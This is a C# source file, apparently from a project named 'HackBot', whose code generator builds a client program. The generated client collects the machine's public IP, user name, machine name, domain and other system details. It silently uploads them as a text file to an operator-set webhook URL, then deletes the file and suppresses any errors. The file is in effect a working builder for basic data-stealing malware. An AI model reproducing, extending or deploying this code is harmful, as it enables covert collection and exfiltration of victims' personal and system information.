using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using HackBot.Modules;

namespace HackBot.ClientBuilder
{
    public class CodeGenerator
    {
        public string GenerateClientCode(HashSet<string> selectedModules, List<IModule> allModules, bool debugEnabled, bool webhookEnabled, string webhookUrl)
        {
            var sb = new StringBuilder();
            
            sb.AppendLine("using System;");
            sb.AppendLine("using System.Net.Http;");
            sb.AppendLine("using System.Text.Json;");
            sb.AppendLine("using System.Threading.Tasks;");
            sb.AppendLine("using System.Text;");
            sb.AppendLine("using System.IO;");
            sb.AppendLine();
            sb.AppendLine("namespace Client");
            sb.AppendLine("{");
            sb.AppendLine("    class Program");
            sb.AppendLine("    {");
            sb.AppendLine($"        const bool DEBUG_ENABLED = {debugEnabled.ToString().ToLower()};");
            sb.AppendLine($"        const bool WEBHOOK_ENABLED = {webhookEnabled.ToString().ToLower()};");
            if (webhookEnabled)
            {
                if (!string.IsNullOrEmpty(webhookUrl))
                {
                    sb.AppendLine($"        const string WEBHOOK_URL = \"{webhookUrl.Replace("\"", "\\\"")}\";");
                }
                else
                {
                    sb.AppendLine("        const string WEBHOOK_URL = \"\";");
                }
            }
            sb.AppendLine();
            sb.AppendLine("        static async Task Main(string[] args)");
            sb.AppendLine("        {");
            sb.AppendLine("            await RunModulesAsync();");
            sb.AppendLine("            if (DEBUG_ENABLED)");
            sb.AppendLine("            {");
            sb.AppendLine("                Console.WriteLine(\"\\nPress any key to exit...\");");
            sb.AppendLine("                Console.ReadKey();");
            sb.AppendLine("            }");
            sb.AppendLine("        }");
            sb.AppendLine();
            sb.AppendLine("        static async Task RunModulesAsync()");
            sb.AppendLine("        {");
            
            if (webhookEnabled)
            {
                sb.AppendLine("            var dataBuilder = new StringBuilder();");
            }

            foreach (var moduleName in selectedModules)
            {
                var module = allModules.FirstOrDefault(m => m.Name == moduleName);
                if (module != null)
                {
                    if (webhookEnabled)
                    {
                        sb.AppendLine($"            await Execute{moduleName}ModuleAsync(dataBuilder);");
                    }
                    else
                    {
                        sb.AppendLine($"            await Execute{moduleName}ModuleAsync();");
                    }
                }
            }
            
            if (webhookEnabled)
            {
                sb.AppendLine("            var formattedContent = FormatTXT(dataBuilder.ToString());");
                sb.AppendLine("            var tempFile = Path.Combine(Path.GetTempPath(), $\"report_{DateTime.Now:yyyyMMdd_HHmmss}.txt\");");
                sb.AppendLine("            File.WriteAllText(tempFile, formattedContent);");
                sb.AppendLine("            await SendToWebhook(tempFile);");
                sb.AppendLine("            try { File.Delete(tempFile); } catch { }");
            }

            sb.AppendLine("        }");
            sb.AppendLine();
            
            if (webhookEnabled)
            {
                sb.AppendLine(@"        static string FormatTXT(string content)
        {
            var sb = new StringBuilder();
            var timestamp = DateTime.Now.ToString(""HH:mm:ss"");
            
            var lines = content.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();
                if (!string.IsNullOrEmpty(trimmedLine))
                {
                    sb.AppendLine(string.Format(""[{0}] [>] | {1}"", timestamp, trimmedLine));
                }
            }
            
            return sb.ToString();
        }
");
                sb.AppendLine(@"        static async Task SendToWebhook(string filePath)
        {
            try
            {
                using var httpClient = new HttpClient();
                using var multipartContent = new MultipartFormDataContent();
                using var fileStream = File.OpenRead(filePath);
                var fileName = Path.GetFileName(filePath);
                var fileContent = new StreamContent(fileStream);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(""text/plain"");
                multipartContent.Add(fileContent, ""file"", fileName);
                var response = await httpClient.PostAsync(WEBHOOK_URL, multipartContent);
            }
            catch
            {
            }
        }
");
            }
            
            foreach (var moduleName in selectedModules)
            {
                var module = allModules.FirstOrDefault(m => m.Name == moduleName);
                if (module != null)
                {
                    sb.AppendLine(GenerateModuleCode(moduleName, module, webhookEnabled));
                }
            }

            sb.AppendLine("    }");
            sb.AppendLine("}");

            return sb.ToString();
        }

        private string GenerateModuleCode(string moduleName, IModule module, bool webhookEnabled)
        {
            if (moduleName == "IP")
            {
                if (webhookEnabled)
                {
                    return $@"        static async Task Execute{moduleName}ModuleAsync(StringBuilder dataBuilder)
        {{
            try
            {{
                using var httpClient = new HttpClient();
                var response = await httpClient.GetStringAsync(""https://api.ipify.org/?format=json"");
                var jsonDoc = JsonDocument.Parse(response);
                var ip = jsonDoc.RootElement.GetProperty(""ip"").GetString();
                
                dataBuilder.AppendLine($""IP address: {{ip}}"");
            }}
            catch (Exception ex)
            {{
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""Error fetching IP: {{ex.Message}}"");
                }}
            }}
        }}
";
                }
                else
                {
                    return $@"        static async Task Execute{moduleName}ModuleAsync()
        {{
            try
            {{
                using var httpClient = new HttpClient();
                var response = await httpClient.GetStringAsync(""https://api.ipify.org/?format=json"");
                var jsonDoc = JsonDocument.Parse(response);
                var ip = jsonDoc.RootElement.GetProperty(""ip"").GetString();
                
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""IP address: {{ip}}"");
                }}
            }}
            catch (Exception ex)
            {{
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""Error fetching IP: {{ex.Message}}"");
                }}
            }}
        }}
";
                }
            }
            else if (moduleName == "SystemInfo")
            {
                if (webhookEnabled)
                {
                    return $@"        static async Task Execute{moduleName}ModuleAsync(StringBuilder dataBuilder)
        {{
            try
            {{
                dataBuilder.AppendLine($""OS Version: {{Environment.OSVersion}}"");
                dataBuilder.AppendLine($""Machine Name: {{Environment.MachineName}}"");
                dataBuilder.AppendLine($""User Name: {{Environment.UserName}}"");
                dataBuilder.AppendLine($""User Domain Name: {{Environment.UserDomainName}}"");
                dataBuilder.AppendLine($""Processor Count: {{Environment.ProcessorCount}}"");
                dataBuilder.AppendLine($""System Directory: {{Environment.SystemDirectory}}"");
                dataBuilder.AppendLine($""Current Directory: {{Environment.CurrentDirectory}}"");
                dataBuilder.AppendLine($""CLR Version: {{Environment.Version}}"");
                dataBuilder.AppendLine($""64-bit OS: {{Environment.Is64BitOperatingSystem}}"");
                dataBuilder.AppendLine($""64-bit Process: {{Environment.Is64BitProcess}}"");
            }}
            catch (Exception ex)
            {{
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""Error collecting system info: {{ex.Message}}"");
                }}
            }}
        }}
";
                }
                else
                {
                    return $@"        static async Task Execute{moduleName}ModuleAsync()
        {{
            try
            {{
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""OS Version: {{Environment.OSVersion}}"");
                    Console.WriteLine($""Machine Name: {{Environment.MachineName}}"");
                    Console.WriteLine($""User Name: {{Environment.UserName}}"");
                    Console.WriteLine($""User Domain Name: {{Environment.UserDomainName}}"");
                    Console.WriteLine($""Processor Count: {{Environment.ProcessorCount}}"");
                    Console.WriteLine($""System Directory: {{Environment.SystemDirectory}}"");
                    Console.WriteLine($""Current Directory: {{Environment.CurrentDirectory}}"");
                    Console.WriteLine($""CLR Version: {{Environment.Version}}"");
                    Console.WriteLine($""64-bit OS: {{Environment.Is64BitOperatingSystem}}"");
                    Console.WriteLine($""64-bit Process: {{Environment.Is64BitProcess}}"");
                }}
            }}
            catch (Exception ex)
            {{
                if (DEBUG_ENABLED)
                {{
                    Console.WriteLine($""Error collecting system info: {{ex.Message}}"");
                }}
            }}
        }}
";
                }
            }

            return string.Empty;
        }
    }
}
